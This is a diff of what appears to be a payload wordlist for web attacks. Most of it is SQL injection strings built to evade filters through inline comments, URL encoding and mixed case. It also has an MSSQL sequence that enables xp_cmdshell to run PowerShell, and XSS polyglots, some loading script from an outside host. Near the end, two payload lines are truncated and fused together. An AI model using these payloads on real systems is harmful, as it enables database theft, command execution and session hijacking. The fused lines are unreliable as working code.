@@ -7,170 +7,170 @@ Union Select 34=35,34=35,34=35,34=35
 Union Select null,null,null,null
 ; EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;--
 ;EXEC xp_cmdshell ‘powershell -c “$x = whoami;
-/*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,null,null,null  
-%55nion(%53elect 1,2,3) null,null,null,null  
-http://domain.com/index.php?id=1+union+distinctROW+select+null,null,null,null--+-  
-http://domain.com/index.php?id=1+ #?uNiOn + #?sEleCt null,null,null,null  
-+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt null,null,null,null  
-/*!%55NiOn*/ /*!%53eLEct*/ null,null,null,null  
-+un/**/ion+se/**/lect null,null,null,null  
-+?UnI?On?+'SeL?ECT? null,null,null,null  
-http://domain.com/index.php?id=1+(UnIoN)+(SelECT)+null,null,null,null--+-  
-+UnIoN/*&a=*/SeLeCT/*&a=*/ null,null,null,null  
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,null,null,null
+%55nion(%53elect 1,2,3) null,null,null,null
+http://domain.com/index.php?id=1+union+distinctROW+select+null,null,null,null--+-
+http://domain.com/index.php?id=1+ #?uNiOn + #?sEleCt null,null,null,null
++ #?1q %0AuNiOn all#qa%0A#%0AsEleCt null,null,null,null
+/*!%55NiOn*/ /*!%53eLEct*/ null,null,null,null
++un/**/ion+se/**/lect null,null,null,null
++?UnI?On?+'SeL?ECT? null,null,null,null
+http://domain.com/index.php?id=1+(UnIoN)+(SelECT)+null,null,null,null--+-
++UnIoN/*&a=*/SeLeCT/*&a=*/ null,null,null,null
 %55nion(%53elect null,null,null,null)
-/**//*!12345UNION SELECT*//**/ null,null,null,null  
-/**//*!50000UNION SELECT*//**/ null,null,null,null  
-/**/UNION/**//*!50000SELECT*//**/ null,null,null,null  
-/*!50000UniON SeLeCt*/ null,null,null,null  
-union /*!50000%53elect*/ null,null,null,null  
-/*!u%6eion*/ /*!se%6cect*/ null,null,null,null  
-/*--*/union/*--*/select/*--*/ null,null,null,null  
+/**//*!12345UNION SELECT*//**/ null,null,null,null
+/**//*!50000UNION SELECT*//**/ null,null,null,null
+/**/UNION/**//*!50000SELECT*//**/ null,null,null,null
+/*!50000UniON SeLeCt*/ null,null,null,null
+union /*!50000%53elect*/ null,null,null,null
+/*!u%6eion*/ /*!se%6cect*/ null,null,null,null
+/*--*/union/*--*/select/*--*/ null,null,null,null
 union (/*!/**/ SeleCT */ null,null,null,null)
-/*!union*/+/*!select*/ null,null,null,null  
-/**/uNIon/**/sEleCt/**/ null,null,null,null  
-+%2F**/+Union/*!select*/ null,null,null,null  
-/**//*!union*//**//*!select*//**/ null,null,null,null  
-/*!uNIOn*/ /*!SelECt*/ null,null,null,null  
-/**/union/*!50000select*//**/ null,null,null,null  
-0%a0union%a0select%09 null,null,null,null  
-%0Aunion%0Aselect%0A null,null,null,null  
-uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ null,null,null,null  
-%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ null,null,null,null  
-/*!union*//*--*//*!all*//*--*//*!select*/ null,null,null,null  
+/*!union*/+/*!select*/ null,null,null,null
+/**/uNIon/**/sEleCt/**/ null,null,null,null
++%2F**/+Union/*!select*/ null,null,null,null
+/**//*!union*//**//*!select*//**/ null,null,null,null
+/*!uNIOn*/ /*!SelECt*/ null,null,null,null
+/**/union/*!50000select*//**/ null,null,null,null
+0%a0union%a0select%09 null,null,null,null
+%0Aunion%0Aselect%0A null,null,null,null
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ null,null,null,null
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ null,null,null,null
+/*!union*//*--*//*!all*//*--*//*!select*/ null,null,null,null
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C null,null,null,null
-/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ null,null,null,null  
-+UnIoN/*&a=*/SeLeCT/*&a=*/ null,null,null,null  
-union+sel%0bect null,null,null,null  
-+#1q%0Aunion all#qa%0A#%0Aselect null,null,null,null  
-%23xyz%0AUnIOn%23xyz%0ASeLecT+ null,null,null,null  
-%23xyz%0A%55nIOn%23xyz%0A%53eLecT+ null,null,null,null  
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ null,null,null,null
++UnIoN/*&a=*/SeLeCT/*&a=*/ null,null,null,null
+union+sel%0bect null,null,null,null
++#1q%0Aunion all#qa%0A#%0Aselect null,null,null,null
+%23xyz%0AUnIOn%23xyz%0ASeLecT+ null,null,null,null
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+ null,null,null,null
 union(select(null),null,null)
-uNioN (/*!/**/ SeleCT */ 11) null,null,null,null  
-/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ null,null,null,null  
-%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ null,null,null,null  
-+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C null,null,null,null  
-/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ null,null,null,null  
-+UnIoN/*&a=*/SeLeCT/*&a=*/ null,null,null,null  
-+/*!UnIoN*/+/*!SeLeCt*/+ null,null,null,null  
-/*!u%6eion*/ /*!se%6cect*/ null,null,null,null  
-uni%20union%20/*!select*/%20 null,null,null,null  
-union%23aa%0Aselect null,null,null,null  
-http://domain.com/index.php?id=1/**/union/*!50000select*/ null,null,null,null  
-/^****union.*$/ /^****select.*$/ null,null,null,null  
-/*union*/union/*select*/select+ null,null,null,null  
-/*!50000UnION*//*!50000SeLeCt*/ null,null,null,null  
-%252f%252a*/union%252f%252a /select%252f%252a*/ null,null,null,null  
+uNioN (/*!/**/ SeleCT */ 11) null,null,null,null
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ null,null,null,null
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ null,null,null,null
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C null,null,null,null
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ null,null,null,null
++UnIoN/*&a=*/SeLeCT/*&a=*/ null,null,null,null
++/*!UnIoN*/+/*!SeLeCt*/+ null,null,null,null
+/*!u%6eion*/ /*!se%6cect*/ null,null,null,null
+uni%20union%20/*!select*/%20 null,null,null,null
+union%23aa%0Aselect null,null,null,null
+http://domain.com/index.php?id=1/**/union/*!50000select*/ null,null,null,null
+/^****union.*$/ /^****select.*$/ null,null,null,null
+/*union*/union/*select*/select+ null,null,null,null
+/*!50000UnION*//*!50000SeLeCt*/ null,null,null,null
+%252f%252a*/union%252f%252a /select%252f%252a*/ null,null,null,null
 AnD null UNiON SeLeCt null,null,null,null;%00 
-AnD null UNiON SeLeCt null,null,null,null+--+-  
+AnD null UNiON SeLeCt null,null,null,null+--+-
 And False Union Select null,null,null,null+--+-
-/*!50000%55nIoN*/ /*!50000%53eLeCt*/  
-%55nion(%53elect 1,2,3)  
-union+distinctROW+select+1,2,3,4-- -  
-#?uNiOn + #?sEleCt  
-#?1q %0AuNiOn all#qa%0A#%0AsEleCt  
-/*!%55NiOn*/ /*!%53eLEct*/  
-+un/**/ion+se/**/lect  
-+?UnI?On?+'SeL?ECT?  
-(UnIoN)+(SelECT)+1,2,3,4-- -  
-+UnIoN/*&a=*/SeLeCT/*&a=*/  
-%55nion(%53elect 1,2,3,4)-- -  
-/**//*!12345UNION SELECT*//**/  
-/**//*!50000UNION SELECT*//**/  
-/**/UNION/**//*!50000SELECT*//**/  
-/*!50000UniON SeLeCt*/  
-union /*!50000%53elect*/  
-/*!u%6eion*/ /*!se%6cect*/  
-/*--*/union/*--*/select/*--*/  
-union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
-/*!union*/+/*!select*/  
-/**/uNIon/**/sEleCt/**/  
-+%2F**/+Union/*!select*/  
-/**//*!union*//**//*!select*//**/  
-/*!uNIOn*/ /*!SelECt*/  
-/**/union/*!50000select*//**/  
-0%a0union%a0select%09  
-%0Aunion%0Aselect%0A  
-uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/  
-%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/  
-/*!union*//*--*//*!all*//*--*//*!select*/  
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/
+%55nion(%53elect 1,2,3)
+union+distinctROW+select+1,2,3,4-- -
+#?uNiOn + #?sEleCt
+#?1q %0AuNiOn all#qa%0A#%0AsEleCt
+/*!%55NiOn*/ /*!%53eLEct*/
++un/**/ion+se/**/lect
++?UnI?On?+'SeL?ECT?
+(UnIoN)+(SelECT)+1,2,3,4-- -
++UnIoN/*&a=*/SeLeCT/*&a=*/
+%55nion(%53elect 1,2,3,4)-- -
+/**//*!12345UNION SELECT*//**/
+/**//*!50000UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
+union /*!50000%53elect*/
+/*!u%6eion*/ /*!se%6cect*/
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3,4)-- -
+/*!union*/+/*!select*/
+/**/uNIon/**/sEleCt/**/
++%2F**/+Union/*!select*/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
+/**/union/*!50000select*//**/
+0%a0union%a0select%09
+%0Aunion%0Aselect%0A
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
+/*!union*//*--*//*!all*//*--*//*!select*/
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
-/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/  
-+UnIoN/*&a=*/SeLeCT/*&a=*/  
-union+sel%0bect  
-+#1q%0Aunion all#qa%0A#%0Aselect  
-%23xyz%0AUnIOn%23xyz%0ASeLecT+  
-%23xyz%0A%55nIOn%23xyz%0A%53eLecT+  
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
++UnIoN/*&a=*/SeLeCT/*&a=*/
+union+sel%0bect
++#1q%0Aunion all#qa%0A#%0Aselect
+%23xyz%0AUnIOn%23xyz%0ASeLecT+
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
 union(select(1),2,3)
-uNioN (/*!/**/ SeleCT */ 11)  
-/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/  
-%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/  
-+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C  
-/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/  
-+UnIoN/*&a=*/SeLeCT/*&a=*/  
-+/*!UnIoN*/+/*!SeLeCt*/+  
-/*!u%6eion*/ /*!se%6cect*/  
-uni%20union%20/*!select*/%20  
-union%23aa%0Aselect  
-/**/union/*!50000select*/  
-/^****union.*$/ /^****select.*$/  
-/*union*/union/*select*/select+  
-/*!50000UnION*//*!50000SeLeCt*/  
+uNioN (/*!/**/ SeleCT */ 11)
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
++UnIoN/*&a=*/SeLeCT/*&a=*/
++/*!UnIoN*/+/*!SeLeCt*/+
+/*!u%6eion*/ /*!se%6cect*/
+uni%20union%20/*!select*/%20
+union%23aa%0Aselect
+/**/union/*!50000select*/
+/^****union.*$/ /^****select.*$/
+/*union*/union/*select*/select+
+/*!50000UnION*//*!50000SeLeCt*/
 %252f%252a*/union%252f%252a /select%252f%252a*/
-/*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-%55nion(%53elect 1,2,3) 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-http://domain.com/index.php?id=1&+n=19901'+union+distinctROW+select+1,2,3,4,5,6,7,8,9,10,12,13,14--+-  
-#?uNiOn + #?sEleCt 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*!%55NiOn*/ /*!%53eLEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-+un/**/ion+se/**/lect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-+?UnI?On?+'SeL?ECT? 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-http://domain.com/index.php?id=1& n=19901'(UnIoN)+(SelECT)+1,2,3,4,5,6,7,8,9,10,12,13,14--+-  
-+UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-%55nion(%53elect 1,2,3,4,5,6,7,8,9,10,12,13,14)-- -  
-/**//*!12345UNION SELECT*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/**//*!50000UNION SELECT*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/**/UNION/**//*!50000SELECT*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*!50000UniON SeLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-union /*!50000%53elect*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*--*/union/*--*/select/*--*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-union (/*!/**/ SeleCT */ 1,2,3,4,5,6,7,8,9,10,12,13,14)-- -  
-/*!union*/+/*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/**/uNIon/**/sEleCt/**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-+%2F**/+Union/*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/**//*!union*//**//*!select*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*!uNIOn*/ /*!SelECt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/**/union/*!50000select*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-0%a0union%a0select%09 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-%0Aunion%0Aselect%0A 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*!union*//*--*//*!all*//*--*//*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
+/*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+%55nion(%53elect 1,2,3) 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+http://domain.com/index.php?id=1&+n=19901'+union+distinctROW+select+1,2,3,4,5,6,7,8,9,10,12,13,14--+-
+#?uNiOn + #?sEleCt 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
++ #?1q %0AuNiOn all#qa%0A#%0AsEleCt 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*!%55NiOn*/ /*!%53eLEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
++un/**/ion+se/**/lect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
++?UnI?On?+'SeL?ECT? 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+http://domain.com/index.php?id=1& n=19901'(UnIoN)+(SelECT)+1,2,3,4,5,6,7,8,9,10,12,13,14--+-
++UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+%55nion(%53elect 1,2,3,4,5,6,7,8,9,10,12,13,14)-- -
+/**//*!12345UNION SELECT*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/**//*!50000UNION SELECT*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/**/UNION/**//*!50000SELECT*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*!50000UniON SeLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+union /*!50000%53elect*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*--*/union/*--*/select/*--*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+union (/*!/**/ SeleCT */ 1,2,3,4,5,6,7,8,9,10,12,13,14)-- -
+/*!union*/+/*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/**/uNIon/**/sEleCt/**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
++%2F**/+Union/*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/**//*!union*//**//*!select*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*!uNIOn*/ /*!SelECt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/**/union/*!50000select*//**/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+0%a0union%a0select%09 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+%0Aunion%0Aselect%0A 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*!union*//*--*//*!all*//*--*//*!select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
-/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-+UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-union+sel%0bect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-+#1q%0Aunion all#qa%0A#%0Aselect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-%23xyz%0AUnIOn%23xyz%0ASeLecT+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-%23xyz%0A%55nIOn%23xyz%0A%53eLecT+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-union(select(1),2,3)-- -  
-uNioN (/*!/**/ SeleCT */ 11) 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-+UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-+/*!UnIoN*/+/*!SeLeCt*/+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-uni%20union%20/*!select*/%20 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-union%23aa%0Aselect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/**/union/*!50000select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/^****union.*$/ /^****select.*$/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*union*/union/*select*/select+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-/*!50000UnION*//*!50000SeLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-%252f%252a*/union%252f%252a /select%252f%252a*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -  
-AnD null UNiON SeLeCt 1,2,3,4,5,6,7,8,9,10,12,13,14;%00-- -  
-AnD null UNiON SeLeCt 1,2,3,4,5,6,7,8,9,10,12,13,14+--+-  
+/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
++UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+union+sel%0bect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
++#1q%0Aunion all#qa%0A#%0Aselect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+%23xyz%0AUnIOn%23xyz%0ASeLecT+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+%23xyz%0A%55nIOn%23xyz%0A%53eLecT+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+union(select(1),2,3)-- -
+uNioN (/*!/**/ SeleCT */ 11) 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
++UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
++/*!UnIoN*/+/*!SeLeCt*/+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+uni%20union%20/*!select*/%20 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+union%23aa%0Aselect 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/**/union/*!50000select*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/^****union.*$/ /^****select.*$/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*union*/union/*select*/select+ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+/*!50000UnION*//*!50000SeLeCt*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+%252f%252a*/union%252f%252a /select%252f%252a*/ 1,2,3,4,5,6,7,8,9,10,12,13,14-- -
+AnD null UNiON SeLeCt 1,2,3,4,5,6,7,8,9,10,12,13,14;%00-- -
+AnD null UNiON SeLeCt 1,2,3,4,5,6,7,8,9,10,12,13,14+--+-
 And False Union Select 1,2,3,4,5,6,7,8,9,10,12,13,14+--+-
 database/*badd*//**/()
 database%23%0A(%23%0A)
@@ -285,7 +285,7 @@ ORDER BY 4--
 ORDER BY 5--
 ORDER BY 6--
 ORDER BY 7--
-1zqjlt/'"(){}<x>:1zqjlt;9/"*/confirm`XSS POC H1`</Script/--><Script>/*
+1zqjlt/'"(){}<x>:1zqjlt;9/"*/confirm`XSS POC H1`</Script/--><Script>/*
 indo"><svg/onload=alert(document.domain);>"dax
 rootbakar<!'/*"/*\'/*\"/*--></Script><Image Srcset=K */; Onerror=alert(document.domain) //>
 '%22()%26%25<acx><ScRiPt%20>prompt(974790)</ScRiPt>
@@ -347,56 +347,16 @@ rootbakar<!'/*"/*\'/*\"/*--></Script><Image Srcset=K */; Onerror=alert(document.
 <!'/*!"/*\'/*\"/**/}confirm'1'?0:function k(){//><svg>
 '"--!></Script%0C><Script/Src=https:knoxss.me/1>
 '"--!></Script/><Svg/Onload=confirm'1'//
-\"-confirm'1'//
-\"-confirm'1'<!--
-\"-confirm'1'%0A-->
-\"-confirm'1'}//
-\"-confirm'1'}<!--
-\"-confirm'1'}%0A-->
-\"-confirm'1',//
-\"-confirm'1',<!--
-\"-confirm'1',%0A-->
-\"-confirm'1'};k={//
-\"-confirm'1'};k={<!--
-\"-confirm'1'};k={%0A-->
-\"}confirm'1';k:{//
-\"}confirm'1';k:{<!--
-\"}confirm'1';k:{%0A-->
-\"}confirm'1'?0:function k(){//
-\"}confirm'1'?0:function k(){<!--
-\"}confirm'1'?0:function k(){%0A-->
-\'-confirm'1'//
-\'-confirm'1'<!--
-\'-confirm'1'%0A-->
-\'-confirm'1'}//
-\'-confirm'1'}<!--
-\'-confirm'1'}%0A-->
-\'-confirm'1',//
-\'-confirm'1',<!--
-\'-confirm'1',%0A-->
-\'-confirm'1'};k={//
-\'-confirm'1'};k={<!--
-\'-confirm'1'};k={%0A-->
-\'}confirm'1';k:{//
-\'}confirm'1';k:{<!--
-\'}confirm'1';k:{%0A-->
-\'}confirm'1'?0:function k(){//
-\'}confirm'1'?0:function k(){<!--
-\'}confirm'1'?0:function k(){%0A-->
+\"-confirm'1'
 "-confirm'1'-"
-1"?confirm'1':"
 "-top["con\x66irm"]'1'-"
 1"?top["con\x66irm"]'1':"
 "-[location="Javas\x63ript:confirm%25281%2529"]-"
-1"?location="Javas\x63ript:confirm%25281%2529":"
 "-[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\143\157\156\146\151\162\155\50\61\51")()-"
 "?[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\143\157\156\146\151\162\155\50\61\51")():"
 '-confirm'1'-'
-1'?confirm'1':'
 '-top['con\x66irm']'1'-'
-1'?top['con\x66irm']'1':'
 '-[location='Javas\x63ript:confirm%25281%2529']-'
-1'?location='Javas\x63ript:confirm%25281%2529':'
 '-[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\143\157\156\146\151\162\155\50\61\51')()-'
 '?[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\143\157\156\146\151\162\155\50\61\51')():'
 '"--!><Script /K/Src=https:@knoxss.me/1>confirm%601%60</Script/K>
@@ -419,18 +379,8 @@ rootbakar<!'/*"/*\'/*\"/*--></Script><Image Srcset=K */; Onerror=alert(document.
 '"--!><K:script xmlns:K="http://www.w3.org/1999/xhtml">confirm'1'</K:script>
 '"--!><K /Ng-App>{{a="".constructor.prototype;a.charAt=a.trim;$eval("a,confirm'1',b")}}
 '"--!><<!--%23set%20var="x"value="svg /o"var="y"value="nload=confirm'1'"--><!--%23echo%20var="x"var="y"-->>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /K>confirm'1'</Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script Src=Data:,confirm'1'>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=Data:,confirm'1'></Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=?callback=confirm'1'//></Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api.json?callback=confirm'1'//></Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api/api.json?callback=confirm'1'//></Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/cart.json?callback=confirm'1'//></Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api/cart.json?callback=confirm'1'//></Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/cart/add.json?callback=confirm'1'//></Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/search.json?callback=confirm'1'//></Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=/api/search.json?callback=confirm'1'//></Script/>
-'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script /Src=https:ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js></Script/><B /Style=position:fixed;top:0;left:0;font-size:999px%0C/Ng-App /Ng-Csp /Ng-Mouseenter=$event.view.confirm(1)>___
+'"--!></Title/</Style/</Script/</Textarea/</Noscript/</Pre/</Xmp><Script
+angular.min.js></Script/><B /Style=position:fixed;top:0;left:0;font-size:999px%0C/Ng-App /Ng-Csp /Ng-Mouseenter=$event.view.confirm(1)>___
